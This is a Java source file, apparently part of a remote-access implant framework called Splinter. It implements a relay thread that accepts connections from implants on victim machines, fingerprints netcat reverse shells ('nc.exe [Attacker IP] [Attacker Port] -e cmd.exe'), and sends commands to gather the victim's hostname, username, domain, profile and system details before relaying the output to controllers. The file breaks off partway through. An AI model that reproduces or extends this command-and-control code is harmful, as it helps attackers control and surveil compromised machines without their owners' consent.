/**
 * This is the intermediary thread required to handle the handshake, and determine if the agent connected is an implant or a controller thread.
 * 
 * All connections will revert to spawning a RelayBot_ImplantThread unless we can determine a controller thread has bee connected, at which point we spawn the controller thread, 
 * and then have that thread add itself to all connected implants
 * 
 * otherwise, an implant connects, this thread handles the interrogation/handshake, spaws a RelayBot_ImplantThread to be the relay between agent and controller, once that thread is alive
 * 
 * Interrogation Thread is the infinite while to read all data passed from what ever socket initially connected to the Relay ServerSocket connected
 * 
 * 
 * THIS IS THREAD_TERMINAL equivalent class
 * 
 * THIS THREAD FACES THE IMPLANT AGENT that originally connects to the relay bot
 * 
 * The infinite while loop is on all data received from the connected implant.  What ever we receive from the connected implant, send it across the print writer of the ForwardConnectionThread
 * 
 * @author Solomon Sonya
 * 
 */


package RelayBot;
import Implant.Driver;
import Implant.FTP.FTP_ServerSocket;
import java.io.*;

import javax.crypto.*;
import java.net.*;
import java.security.*;
import java.util.*;

import javax.swing.*;
import javax.swing.Timer;
import java.awt.*;
import java.awt.event.*;

public class DEPRECATED_RelayBot_AgentConnectedToRelayBot extends Thread implements Runnable, ActionListener
{
String strMyClassName = "RelayBot_AgentConnectedToRelayBot";
	
	private Vector<String> vctMyRowData = new Vector<String>();
	
	
	private BufferedReader brIn_ConnectedAgent = null;
	private PrintWriter pwOut_ConnectedAgent = null;
	public Socket sktMyConnection_ConnectedAgent = null;
	
	public volatile boolean dataAcquisitionComplete = false;//used to know if we suppress messages received from client
		
	public static final String WINDOWS_COMMAND_PROMPT_HEADER_STRING = "[Version";//win xp and above	
	public static final String NEWER_VERSION_OF_CMD_PROMPT_HEADER_STRING = "Copyright (c)"; //LIKE on win 2000 boxes
	public static final String OLDER_VERSION_OF_CMD_PROMPT_HEADER_STRING = "(C) Copyright"; //LIKE on win 2000 boxes
			
	long myThread_ID = this.getId();
	int myIMPLANT_ID = 0;
	
	public volatile boolean I_am_Disconnected_From_Implant = false;
	
	public volatile long myRandomIdentifier = 0;
			
	String myLocalControllerPort = "", myLocalController_IP = "", myVictim_RHOST_IP = "", myRemote_RHOST_Port = "";
	String 	I_have_an_important_message = " ",//to state we are still interrogating the system
			
			
			myImplantName = "UNKNOWN",
			myImplantInitialLaunchDirectory = "",
			myBinaryFileName = "UNKNOWN",
			myHostName = "", 
			myOS = "", 
			myOS_Shortcut = "",
			myServicePack = "", 
			myUserName = "", 
			myUserDomain = "",  
			myHomeDrive = "", 
			myProcessorArchitecture = "",
			myCountryCode = "",
			myNumberOfUsers = "",
			myOS_Architecture = "",
			mySerialNumber = "",
			myVersionNumber = "",			
			myNumberOfProcessors = "",
			myOS_Type = "",
			mySystemRoot = "",
			myUserProfile = "",
			myTempPath = "",
			myDisconnectionTime = "",
			myUniqueDelimiter = "";
	
	public String myFullGeoData = "GEO Data Not Queried on Relay";
					
	public volatile boolean continueRun = false;
	public volatile boolean killThread = false;
	
	public volatile ArrayList<String> alReceivedLine = new ArrayList<String>();
	public volatile boolean processInterrupt = true; //SEMAPHORE!!!
	public Timer tmrReadLine = null;
	String inputLine = "";
	public volatile boolean closingRunningProcessFrame = false;
	
	public volatile boolean pauseRunningProcessUpdate = false;
	
	//public String strAgentHandShake = "";
	public String myCurrentWorkingDirectory = " > ";
		
	public DEPRECATED_RelayBot_AgentConnectedToRelayBot(Socket skt)
	{
		sktMyConnection_ConnectedAgent = skt;
	}
	
	public volatile ArrayList<DEPRECATED_RelayBot_ForwardConnectionThread> alForwardControllers = new ArrayList<DEPRECATED_RelayBot_ForwardConnectionThread>();
	
	public void run()
	{
		try
		{
			
			
			Driver.sop("In thread ID: " + this.getId());
			
			//open streams
			Driver.sop("In thread: " + myThread_ID + ".  Attempting to open streams on socket...");
			
			//input from implant
			brIn_ConnectedAgent = new BufferedReader(new InputStreamReader(sktMyConnection_ConnectedAgent.getInputStream()));
			
			//output to implant
			pwOut_ConnectedAgent = new PrintWriter(new BufferedOutputStream(sktMyConnection_ConnectedAgent.getOutputStream()));
			
			//Streams opened
			Driver.sop("Streams opened");
			
			
			//get connection data
			myLocalControllerPort = sktMyConnection_ConnectedAgent.getLocalAddress().toString();
			myLocalController_IP = "" + sktMyConnection_ConnectedAgent.getLocalPort();
			myVictim_RHOST_IP = "" + sktMyConnection_ConnectedAgent.getInetAddress().toString();
			Driver.sop(sktMyConnection_ConnectedAgent.getInetAddress().toString());
			Driver.sop(sktMyConnection_ConnectedAgent.getLocalAddress().toString());
			Driver.sop(sktMyConnection_ConnectedAgent.getLocalSocketAddress().toString());
			myRemote_RHOST_Port = "" + sktMyConnection_ConnectedAgent.getPort();
			
			continueRun = true;
								
			//HANDSHAKE
			if(Driver.acquireAgentOverheadData)
			{
				acquireOverheadData(brIn_ConnectedAgent, pwOut_ConnectedAgent);
				
				//Acquisition complete
				Driver.sop("Overhead of Data Aquisition complete for this thread ID: " + myThread_ID + ".");
				
				this.connectToForwardControllerIfApplicable();
			}
			
			
			
			//infinite while loop on any text received from the agent.  this might not be necessary because unlike a chat client, we are connected clients do not spontaneously report data. instead they respond to commands we send to it.  nevertheless, i could have use for this at some time, i'll put it in
			
			/*solution!!!
			Buffer all responses in an arraylist first, (use the while loop to forever listen and buffer for us, )
			then use the timer to pop (remove first) from the arraylist and immediately send to determine command*/
			//myFileBrowser = new Frame_FileBrowser(this);
			//myFileBrowser.setVisible(true);

			/*******************************************
			 * 
			 * Prob for now, if we use our improved 
			 * buffering, working with netcat breaks the entire program, 
			 * so we'll infinite while on netcat for now, and work better 
			 * with our own implants and come back later to fix!
			 * 
			 * 
			 * 
			 * 
			 * 
			 * 
			 * 
			 * 
			 * ******************************************/
			
			if(this.myIMPLANT_ID == Driver.IMPLANT_ID_NETCAT)
			{
				//we haven't established a forward connection if necessary if this is a netcat client (we already have if it's a Splinter system, but not for netcat yet)
				//this.connectToForwardControllerIfApplicable();
				
				while(continueRun && !this.killThread && !this.sktMyConnection_ConnectedAgent.isClosed() && (!(inputLine = brIn_ConnectedAgent.readLine()).equals(Driver.DISCONNECT_TOKEN)) && inputLine != null)//listen until agent says disconnect
				{
					if(inputLine == null || inputLine.trim().equals(""))
						continue;
					
					//if(dataAcquisitionComplete)
					//{
					//	continue;//do not post received message below
					//}
					
					//Driver.sop("Received line in Terminal Thread: " + inputLine);
					//HANDLE SPLINTER IMPLANT SPECIFICALLY
					if(inputLine.trim().startsWith(Driver.RELAY_FORWARD_DELIMETER) || inputLine.trim().startsWith(myUniqueDelimiter))
					{
						if(!determineCommand(inputLine))
						{
							//error on line received, thus display what we received on the main terminals
							sendResponseToForwardController(inputLine);
						}
						continue;
					}
					
					//otherwise, display what we received on the main terminals
					this.sendResponseToForwardController(inputLine);
					
					
					
				}//end while*/
			}
			else
			{
				//REPLACE THE WHILE LOOP WITH A TIMER INTERRUPT TO BE MORE EFFICIENT!!!
				//LET THE THREAD INTERRUPT, IF THERE'S A LINE TO READ, HANDLE IT AND SLEEP. REPEAT.
				//THIS SHOULD PREVENT THE GUI FROM BLOCKING WHEN EVER WE HAVE A LOT OF OLINES BEING READ FROM THE IMPLANT
				
				//start timer to interrupt and read from socket
				if(tmrReadLine != null && tmrReadLine.isRunning())
				{
					try
					{
						tmrReadLine.stop();
					}catch(Exception ee){}
				}
				
				processInterrupt = false;							
				tmrReadLine = new Timer(Driver.THREAD_READLINE_INTERRUPT_INTERVAL_MILLIS, this);
				tmrReadLine.start();
				
				//the thread is started, enter infinite while loop to read everything that comes across the wire and then simply add to the arraylist
				while(continueRun && !this.killThread && !this.sktMyConnection_ConnectedAgent.isClosed() && (!(inputLine = brIn_ConnectedAgent.readLine()).equals(Driver.DISCONNECT_TOKEN)) && inputLine != null)//listen until agent says disconnect
				{
					if(inputLine == null || inputLine.trim().equals(""))
						continue;
					
					//otherwise, add the line to the arraylist to be analyzed by the timer interrupt
					this.alReceivedLine.add(inputLine);
					//Drivers.sop("Size: " + this.alReceivedLine.size());
					
					processInterrupt = true;
				}
				
			}
			
		
			
		}//end try
		catch(Exception e)
		{
			Driver.sop("Thread ID: " + myThread_ID + ": Streams (and socket) are closed for this socket.  If possible, attempt for implant to reconnect");
		}
		
		/*********************************************************
		 * 
		 * 
		 * BROKE OUT OF WHILE LOOP, CLEAN SELF AND CLOSE!!!
		 * 
		 * 
		 * *******************************************************/
		
		//send disconnection notice to the connected implant
		try
		{
			this.sendCommand_RAW_ToAgent(inputLine);//tell connected implant to disconnect if necessary
		}catch(Exception e){}
		
		this.cleanThreadAndClose();
		
		
		
		
	}
	
	public void actionPerformed(ActionEvent ae)
	{
		try
		{
			if(ae.getSource() == this.tmrReadLine)
			{
				try
				{
					//ensure we're still connected and such
					if(!continueRun || this.killThread || this.sktMyConnection_ConnectedAgent.isClosed())
					{
						//force disconnecion and removal of the thread!
						this.closeThread();
					}
				}
				catch(Exception e){}
				
				if(this.alReceivedLine != null && this.alReceivedLine.size() > 0)
				{
					processInterrupt = false;//do not handle additional interrupts until done
					readLineFromSocket();//read the next line from the socket
				}
				
				/*if(this.processInterrupt)
				{
					processInterrupt = false;//do not handle additional interrupts until done
					readLineFromSocket();//read the next line from the socket
				}*/
				
				
			}
			
		}
		catch(Exception e)
		{
			Driver.eop("AE" , strMyClassName, e, e.getLocalizedMessage(), false);
			
		}
	}
	
	public boolean cleanThreadAndClose()
	{
		try
		{
			
			//out of while loop, clean and close!
			continueRun = false;
			I_am_Disconnected_From_Implant = true;
			
			myDisconnectionTime = Driver.getTimeStamp_Without_Date();
			if(myDisconnectionTime == null)
			{
				myDisconnectionTime = "";
			}
			
			//Stop the thread from running
			try
			{
				tmrReadLine.stop();
			}catch(Exception ee){}
			
			//clean the frames if they are indicating a private message!
			try
			{
				/*for(int i = 0; i < this.alJtxtpne_PrivatePanes.size(); i++)
				{
					this.alJtxtpne_PrivatePanes.get(i).appendStatusMessageString(false, "------------>>>>>>>> DISCONNECTED FROM CLIENT @" + myDisconnectionTime);
				}*/
				
			}catch(Exception e){}
			
			//if the agent has disconnected, then all forward threads to the controller on this agents behalf must be terminated as well
			for(int i = 0; i < this.alForwardControllers.size(); i++)
			{
				alForwardControllers.get(i).sktMyConnection.close();//starve the forward connetion!
			}
			
			this.I_am_Disconnected_From_Implant = true;
			this.killThread = true;
			
			//remove myself from arraylist		
//RelayBot_ServerSocket.removeImplantThread(this, this.getId());
			
			//and hopefully, we'll leave this thread to die sloftly...
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("cleanThreadAndClose", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	public boolean readLineFromSocket()
	{
		try
		{
			/*So far, all attempts to fix this conundrum have been unsuccessful.  therefore, the best approach is to still have
			 * the while loop, except when we receive new lines, immediately add them to an arraylist, 
			 * and then return to the while loop up top.  Then have a separate timer thread that is interrupting to check 
			 * if there are contents in this arraylist, if so, we act upon it, otherwise, we sleep again
			 * 
			 * 
			 * 
			 * 
			 */
			
			if(this.alReceivedLine == null || this.alReceivedLine.size() < 1)
			{
				return false;
			}
			
			//pop the instruction from the stack
			inputLine = this.alReceivedLine.remove(0);
			
			//check if null line is received, this means the implant disconnected from the socket
			if(inputLine == null)
			{
				throw new SocketException("Socket Appears to Be Closed");
			}
			
			//otherwise, pop the first instruction, and send it to determine command
			if(inputLine.trim().startsWith(Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION) || inputLine.trim().startsWith(myUniqueDelimiter))
			{
				if(!determineCommand(inputLine))//for shortcuts
				{
					//error on line received, thus display what we received on the main terminals
					sendResponseToForwardController(inputLine);
				}
	 			
				processInterrupt = true;//release the semaphore
				return true;				
			}

			//otherwise, relay what ever we just received over to the connected controllers for this thread
			this.sendResponseToForwardController(inputLine);				
							
			processInterrupt = true;//release the semaphore
			return true;	
			
			//so we're going to redesign this implementation!
			/*
			 * Before, even if we implement the timer and interrupt, it works perfectly if the socket remains connected, however,  if the socket closes prematurely, this thread never recognizes a disconnection has occured
			 * therefore to fix it, we will still have the timer, however as soon as we come in here, we will then wait on the first line to be read, after we finish processing that line, we'll release the semaphore
			 * this way, we're not just waiting on the br.ready() method, because that never recognizes if the socket is still connected to splinter
			 * 
			 * 
			 * 
			 */
			
			//NOTE: THE SEMAPHORE IS STILL LOCKED AT THIS POINT
			
			
		}
		
		catch(SocketException se)
		{
			Driver.sop("Socket detected in " + this.strMyClassName + " has returned value expected from a closed socket. Perhaps implant has disconnected abruptly.  Cleaning up thread...");
		}
		
		catch(Exception e)
		{
			Driver.eop("readLineFromSocket", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		//processInterrupt = true;//release the semaphore
		//this.tmrReadLine.start();
		return false;
	}
	
	public boolean sendResponseToForwardController(String inputLine)
	{
		//IN THIS CASE, this post response, is to send the received information from the connected agent to the appropriate socket
		
		try
		{
		////Determine if we post response in main broadcast frame or if we are to post into private messages
			if(this.alForwardControllers != null && this.alForwardControllers.size() > 0 && inputLine != null)
			{				
				
				for(int i = 0; i < this.alForwardControllers.size(); i++)
				{
					//determine if it is a response to post, or just the current working directory being echoed back to us
					//only update if our current directory is not what is already posted
					try
					{
						//simply take the line received, and relay it over to the next system
						alForwardControllers.get(i).sendToController_Or_Next_Relay(inputLine, false);
					}
					catch(Exception e)
					{
						//proceed just as before, not sure why an error occurred!
						continue;
					}
					
					
					
				}

			}
			

			return true;
		}
		catch(Exception e)
		{
			Driver.eop("sendResponseToForwardController", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	public boolean removeForwardConnectionThread(DEPRECATED_RelayBot_ForwardConnectionThread threadToRemove, long threadID_ToRemove)
	{
		try
		{
			//remove the forward (relay connection to the controller or next hop relay machine)
			if(alForwardControllers == null || alForwardControllers.size() < 1)
			{
				Driver.sop("ArrayList is empty. No clients further to remove");
				return false;
			}
			
			//remove thread from Active Implant's list
			if(alForwardControllers.contains(threadToRemove))
			{
				alForwardControllers.remove(threadToRemove);
				
			}
			
			//update connected agents
			//updateConnectedImplants();
			
									
			return true;
		}
		catch(Exception e)
		{
			Driver.sop("Exception handled when removing thread id: " + threadID_ToRemove + " in RelayBot_ServerSocket");
		}
		
		
		//updateConnectedImplants();		
		return false;
	}
	
	private boolean determineCommand(String line)
	{
		try
		{
			if(line == null || line.trim().equals(""))
			{
				return false;
			}
			
			else if(line.startsWith(Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION))
			{
				//HANDSHAKE WITH SPLINTER IMPLANT!
				
				//LABEL THE IMPLANT
				this.myIMPLANT_ID = Driver.IMPLANT_ID_SPLINTER_IMPLANT;
				try{this.myImplantName = Driver.ARR_IMPLANT_NAME[myIMPLANT_ID];}catch(Exception e){this.myImplantName = "UNKNOWN";}
//Drivers.sop(line);			
				Driver.sop("-->>>> Ooooohhh Joy! Looks like we have a " + myImplantName + " connected!  -->>>> confidence: 100%.  Setting up the environment to handle this type of implant");		          		
				
				/**
				 * NOTE: THIS IS A POTENTIAL BUFFER OVERFLOW LOCATION... I DON'T CHECK WHAT IS PROVIDED FROM THE USER, I JUST READ EVERYTHING!
				 */
				
				//REMOVE THE HEADER DATA
				try{	line = line.replace(Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION, ""); }catch(Exception e){}
								
				//split the input received
				String [] arrAgent = line.split(Driver.delimeter_1);
				
				//Save the Data Just Received!
				this.myImplantInitialLaunchDirectory = arrAgent[0]; 
				this.myHostName = arrAgent[1]; 
				this.myOS = arrAgent[2]; 
				this.myOS_Type = arrAgent[3]; 
				this.myUserName = arrAgent[4]; 
				this.myUserDomain = arrAgent[5]; 
				this.myTempPath = arrAgent[6]; 
				this.myUserProfile = arrAgent[7]; 
				this.myProcessorArchitecture = arrAgent[8]; 
				this.myNumberOfProcessors = arrAgent[9]; 
				this.mySystemRoot = arrAgent[10]; 
				
				this.myServicePack = arrAgent[11]; 
				this.myNumberOfUsers = arrAgent[12]; 
				this.mySerialNumber = arrAgent[13];
				this.myOS_Architecture = arrAgent[14];     
				this.myCountryCode = arrAgent[15];       
				this.myVersionNumber = arrAgent[16]; 
				this.myHomeDrive = arrAgent[17]; 				
												
				//get my unique random identifier for this thread and send the unique random number back as an ACK. The implant will use this now to uniquely ask questions from the controller
				this.myRandomIdentifier = Driver.getUniqueRandomNumber();
				
				//save my unique identifier now
				this.myUniqueDelimiter = Driver.SPLINTER_DELIMETER_OPEN + myRandomIdentifier + "]";
				
				//send rand number back to implant as ACK
				this.sendCommand_RAW_ToAgent("" + myRandomIdentifier);
				
				//alert implant it is connected to a relay!
				this.sendCommand_RAW_ToAgent(Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.RELAY_NOTIFICATION_YOU_ARE_CONNECTED_TO_RELAY);
				
				//strAgentHandShake = line;
				
				//Now that handshake is complete, check if we establish a connection to the controller
				//connectToForwardControllerIfApplicable();
				
				return true;
				
			}
			
			else if(line.startsWith(this.myUniqueDelimiter))
			{
				
				try//if the below fails at any point, simply display what we received to the terminal
				{
					return false;//nothing to do here for now...
					
					
				}//end try
				catch(Exception e)
				{
					//this.postResponse(line);
				}
				
				
				
			}
			
			//else, no matches, return false;
			
			return false;
			
		}
		
		catch(Exception e)
		{
			Driver.eop("determineCommand", strMyClassName, e, e.getLocalizedMessage(), false);
			Driver.sop("Geez!!!!  Missed it by that much. Authentication failed for this implant... invalid parameters passed in");
			
			
		}
		
		this.myIMPLANT_ID = Driver.IMPLANT_ID_UNKNOWN;
		try{this.myImplantName = Driver.ARR_IMPLANT_NAME[myIMPLANT_ID];}catch(Exception e){this.myImplantName = "UNKNOWN";}
		
		
		//connectToForwardControllerIfApplicable();
		
		return false;
	}
	
	public boolean connectToForwardControllerIfApplicable()
	{
		try
		{
			//Now that handshake is complete, check if we establish a connection to the controller
			/*if(RelayBot_ServerSocket.connectOutToController_Or_Next_RelaySystem)
			{
				
				RelayBot_ForwardConnectionThread forwardConnection = new RelayBot_ForwardConnectionThread(this, RelayBot_ServerSocket.strForwardAddressToController, RelayBot_ServerSocket.portToController, true, true, Driver.RELAY_BEACON_INTERVAL_MILLIS);
				forwardConnection.start();
				this.alForwardControllers.add(forwardConnection);
			}*/
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("connectToForwardControllerIfApplicable", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}

	private boolean acquireOverheadData(BufferedReader brSocket, PrintWriter pwSocket)
	{
		try
		{
			//NOTE: we will still have to determine if this is a windows or linux agent and modify calls accordingly
			
			acquireOverheadData_WINDOWS(brSocket, pwSocket);
			
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("acquireOverheadData", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		
		
		return false;
	}
	
	/**
	   * 
	   * NOTE!!!!!!!!!!!!
	   * DO NOT CHANGE THE INTERROGATION ORDER FOR NETCAT
	   * IF YOU WANT TO ADD MORE COMMANDS, ADD IT AT THE END!!!!!
	   * 
	   * @param brSocket
	   * @param pwSocket
	   * @return
	   */
	private boolean acquireOverheadData_WINDOWS(BufferedReader brSocket, PrintWriter pwSocket)
	{
		dataAcquisitionComplete = true;
		String strFirstLine = "";
		
		try
		{
//Drivers.jop_Error("Solo",  "Old Version, need to handle hand shake! continue from here");
//clear to continue for now
//pwSocket.println("");
//return true;
			
			//NEED TO DETERMINE IMPLANT CONNECTED TO!
			Driver.sop("\nAttempting to interrogate connected implant to determine agent type...");
			
			//For this to work, we expect the agent to return a line value indicating we are connected and such
			strFirstLine = brSocket.readLine();

			/**********************************************************************************************
	  		 * SPLINTER - IMPLANT 
	  		 *********************************************************************************************/
	  		if(strFirstLine != null && (strFirstLine.trim().startsWith(Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION) /*|| strFirstLine.trim().startsWith(myUniqueDelimeter)*/))
			{
	  			
				if(!determineCommand(strFirstLine))
				{
					//error on line received, thus display what we received on the main terminals
					throw new UnsupportedOperationException ("Unknown Agent Connected");
				}

				else//we know the implant connected and have already handled the handshake
				{
					I_have_an_important_message = "";//clear the field to state we're done interrogating
					RelayBot_ServerSocket.updateConnectedImplants();					
					dataAcquisitionComplete = true;
					return true;
				}
			}

			//check if the agent bindsd to cmd.exe command prompt on a windows machine
			if(strFirstLine != null && strFirstLine.contains(WINDOWS_COMMAND_PROMPT_HEADER_STRING))
			{
				//looks like we're connected to an implant bounded to cmd.exe terminal. 
				
				//NOTE: there are different versions of command prompt.  each returning a slightly different format. determine which command prompt version is applicable below				
		  		//Drivers.sop("First line contains search string: " + "\"" + WINDOWS_COMMAND_PROMPT_HEADER_STRING + "." + "- Which appears to match first line from a backdoor that binds to cmd.exe similar to executing the command: nc.exe [Attacker IP] [Attacker Port] -e cmd.exe." + " ##>Confidence level for netcat: 25% --> I am launching the netcat_windows subroutine to configure the environment...");
				Driver.sop("-> Interesting. It appears I am connected to a backdoor that binds to cmd.exe similar to executing the command: nc.exe [Attacker IP] [Attacker Port] -e cmd.exe.  Perhaps this is a netcat implant" + " --> Confidence level for netcat: 25% --> I am launching the netcat_windows subroutine to configure the environment...");
		  			  		
		  		//read next line, should contain "Copyright (c) 2009 Microsoft Corporation.  All rights reserved." for the current version of cmd.exe or "(C) Copyright 1985-2000 Microsoft Corp." for the older version of command prompt. Read next line to determins
		  		String strSecondLine = brSocket.readLine();		      	
		      	
		  		
		      	/**********************************************************************************************
		      	 * NEWER CMD PROMPT VERSION "Copyright (c) 2009 Microsoft Corporation.  All rights reserved."
		      	 *********************************************************************************************/
		  		if(strSecondLine != null && strSecondLine.contains(NEWER_VERSION_OF_CMD_PROMPT_HEADER_STRING))
		      	{
		      		//yup, this appears to be netcat, the full line should actually be similar to this "Copyright (c) 2009 Microsoft Corporation.  All rights reserved."
		      		//Drivers.sop("Second line contains search string: " + "\"" + NEWER_VERSION_OF_CMD_PROMPT_HEADER_STRING + "\"." + "- Which appears to match the second line from netcat binding to cmd.exe stating \"Copyright (c) 2009 Microsoft Corporation.  All rights reserved. \"" + " ##>Confidence level for netcat: 50% --> I am skipping the next blank line");
		  			Driver.sop("-->> This is good. It appears it is a netcat implant -->> Confidence level for netcat: 50% ...");
		      		
					//interrogate the agent, if we return true... interrogation is complete, and we have confirmed its netcat, and have received all fields pertinent to the query
					if(interrogateNewAgent_NETCAT_NEWER(brSocket))
					{
						RelayBot_ServerSocket.updateConnectedImplants();
						dataAcquisitionComplete = true;
						I_have_an_important_message = "";//clear the field to state we're done interrogating
						return true;

					}					
					
					else//we don't know the system connected here
					{
						//unknown agent, but throw an exception to handle it for us
						throw new UnsupportedOperationException ("Unknown Agent Connected");
					}
					
		      	}
		  		
		  		/**********************************************************************************************
		      	 * OLDER CMD PROMPT VERSION "(C) Copyright 1985-2000 Microsoft Corp."
		      	 *********************************************************************************************/
		  		else if(strSecondLine != null && strSecondLine.contains(OLDER_VERSION_OF_CMD_PROMPT_HEADER_STRING))
		      	{
		      		//yup, this appears to be netcat, but running on an older cmd.exe instance.  the full line should actually be similar to "(C) Copyright 1985-2000 Microsoft Corp."
		  			//Drivers.sop("Geez! Older version of Windows Command Prompt Detected! Second line contains search string: " + "\"" + OLDER_VERSION_OF_CMD_PROMPT_HEADER_STRING + "\"." + "- Which appears to match the second line from netcat binding to cmd.exe stating \"(C) Copyright 1985-2000 Microsoft Corp.\"" + " ##>Confidence level for netcat: 50% --> I am skipping the next blank line");
		  			Driver.sop("-->> Geez! Older version of Windows Command Prompt Detected! -->> Confidence level for netcat: 50% ...");
	      		  					  			
					//interrogate the agent, if we return true... interrogation is complete, and we have confirmed its netcat, and have received all fields pertinent to the query
					if(interrogateNewAgent_NETCAT_OLDER(brSocket))
					{
						RelayBot_ServerSocket.updateConnectedImplants();
						dataAcquisitionComplete = true;
						I_have_an_important_message = "";//clear the field to state we're done interrogating
						return true;

					}					
					
					else//we don't know the system connected here
					{
						//unknown agent, but throw an exception to handle it for us
						throw new UnsupportedOperationException ("Unknown Agent Connected");
					}
					
		      	}
		  	
				  
		      	
			}
			
			else//we don't know the system connected here
			{
				//unknown agent, but throw an exception to handle it for us
				throw new UnsupportedOperationException ("Unknown Agent Connected");
			}
			
			/*else if (strFirstLine != null && strFirstLine.contains(OLDER_VERSION_OF_CMD_PROMPT_HEADER_STRING))
			{
				//older version of windows command prompt!!!
				interrogateNewAgent_NETCAT_Older(brSocket);
			}*/
			
			
						
			I_have_an_important_message = "";//clear the field to state we're done interrogating
			RelayBot_ServerSocket.updateConnectedImplants();
			dataAcquisitionComplete = true;
			
			return true;
		}
		
		catch(UnsupportedOperationException uoe)
		{
			//No biggie, simply alert user we dont know who this is. sad panda!
			Driver.sop("Interrogation to this system failed (Thread ID: " + this.myThread_ID + ").  First Line returned: \"" + strFirstLine + "\" I can not determine the type of agent connected.  However, you might still be able to correspond with the agent!");
			
			//send a blank line to continue the conversation
			pwSocket.println("");
			
			//fall thru to return false;
		}
		
		catch (SocketException se)
		{
			Driver.sop("Well then!!!  Socket closed abruptly - I am disposing of this thread meant to corresponsd with the implant" );
			continueRun = false;
			
			//remove myself from arraylist		
//RelayBot_ServerSocket.removeImplantThread(this, this.getId());
								
		}
		
		catch (Exception e)
		{
			Driver.eop("acquireOverheadData_WINDOWS", this.strMyClassName, e, e.getLocalizedMessage(), false);
			
			//No biggie, simply alert user we dont know who this is. sad panda!
			Driver.sop("Interrogation to this system failed Thread ID: [" + this.myThread_ID + "].  First Line returned: \"" + strFirstLine + "\" I can not determine the type of agent connected.  However, you might still be able to correspond with the agent!");
			
			//send a blank line to continue the conversation
			pwSocket.println("");
			
		}
		
		dataAcquisitionComplete = true;
		I_have_an_important_message = "";//clear the field to state we're done interrogating
		RelayBot_ServerSocket.updateConnectedImplants();
		return false;
	}
	  /**
	   * 
	   * VITAL: DO NOT CHANGE THE ORDER COMMANDS ARE ISSUED HERE
	   * IF YOU WANT TO ADD, ADD AT THE END OF THE METHOD!!!!!
	   * 
	   * This Netcat is the newer version of windows command prompt
	   * 
	   * @param brSocket
	   * @return
	   */
	  public boolean interrogateNewAgent_NETCAT_NEWER(BufferedReader brSocket)
	  {
		  
		  try
		  {
			//at this point, we have read the first 2 lines from the agent: "Microsoft windows [Version ...]" and "Copyright (c) 2009 Microsoft Corporation.  All rights reserved."  Read the 3rd line.  This should be blank and continue from there
      		        		
      		//read the next line --> should be blank!
      		String strThirdLine = brSocket.readLine();      		
      		
      		if(strThirdLine != null && strThirdLine.trim().equals(""))
          	{
      			//yup, third line is blank, definitely appears to be nc.exe [LHOST] [PORT] -e cmd.exe
          		//Drivers.sop("Third line is blank as expected when cmd.exe is used with the implant" + " ##>Confidence level for netcat: 75% --> I am reading the final line to determine the netcat execution path");
      			Driver.sop("-->>> Almost there... Confidence level for netcat: 75% ...");
          		          		    
          		//send a blank line to see the final input provided
          		this.sendCommand_RAW_ToAgent("");
          		
          		//read the next line --> should be blank!
          		String strFourthLine = brSocket.readLine();          		
          		
          		if(strFourthLine != null && strFourthLine.trim().endsWith(">"))
              	{
          			//as best as we can, this is a netcat machine, indicate accordingly
              		//Drivers.sop("Final line contains search parameter \">\" which appears to be the initial launch directory of of a known implant. I will label this implant netcat" + " ##>Confidence level for netcat: 100% --> I am sending commands to better interrogate the system now...");
          			Driver.sop("-->>>> OK. So as best as I can tell, this is a netcat agent. I will label this implant netcat" + " -->>>> Confidence level for netcat: 100% -->>>> I am sending commands to better interrogate the system now...");
              		
              		/*******************
              		 * SET IMPLANT ID
              		 *******************/
              		this.myIMPLANT_ID = Driver.IMPLANT_ID_NETCAT;
              		try{this.myImplantName = Driver.ARR_IMPLANT_NAME[myIMPLANT_ID];}catch(Exception e){this.myImplantName = "UNKNOWN";}
              		   		
              		//done!!!!!
              		//proceed to interrogate the system
              		
              		myImplantInitialLaunchDirectory = strFourthLine;
              		
              		//read final line to clear buffer
              		brSocket.readLine();
              	}
          		
          	}
	      	
			  this.sendCommand_RAW_ToAgent("hostname");
		      brSocket.readLine();//get rid of echoed command
		      this.myHostName = brSocket.readLine();
		      
		      /*if(myHostName.equals(myImplantInitialLaunchDirectory))
		      {
		    	  //try to send again
		    	  sendCommand_RAW("hostname");
		          this.myHostName = brSocket.readLine();
		      }*/
		     
		      sendCommand_RAW_ToAgent("echo %username%");
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myUserName = brSocket.readLine();      
		      
		
		      sendCommand_RAW_ToAgent("echo %homedrive%");
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myHomeDrive = brSocket.readLine();
		     
		
		      sendCommand_RAW_ToAgent("echo %NUMBER_OF_PROCESSORS%");
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myNumberOfProcessors = brSocket.readLine();
		      
		      sendCommand_RAW_ToAgent("echo %OS%");
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myOS_Type = brSocket.readLine();
		
		      sendCommand_RAW_ToAgent("echo %PROCESSOR_ARCHITECTURE%");
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myProcessorArchitecture = brSocket.readLine();
		
		      sendCommand_RAW_ToAgent("echo %SystemRoot%");
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.mySystemRoot = brSocket.readLine();
		
		      sendCommand_RAW_ToAgent("echo %USERDOMAIN%");
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myUserDomain = brSocket.readLine();
		
		      sendCommand_RAW_ToAgent("echo %USERPROFILE%");
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myUserProfile = brSocket.readLine();
		
		      sendCommand_RAW_ToAgent("echo %TEMP%");
		      brSocket.readLine();
		      brSocket.readLine();
